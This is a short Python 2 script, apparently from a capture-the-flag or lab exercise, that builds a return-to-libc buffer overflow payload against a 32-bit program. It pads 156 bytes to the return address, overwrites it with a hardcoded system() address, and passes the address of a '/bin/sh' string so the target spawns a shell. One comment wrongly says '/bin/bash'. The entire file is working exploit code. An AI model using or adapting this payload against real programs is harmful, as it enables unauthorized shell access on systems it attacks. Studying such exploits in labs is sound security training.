import struct

bin_sh_addr = 0x804a060
rop_start = 156 # Number of bytes before we reach RA
system_addr = 0xb7e63190

s = "/bin/sh\x00"
s += "A"*(rop_start - len(s))
s += struct.pack("<L", system_addr)
s += "AAAA" # New RA
s += struct.pack("<L", bin_sh_addr) # First arg = "/bin/bash\x00"

print s
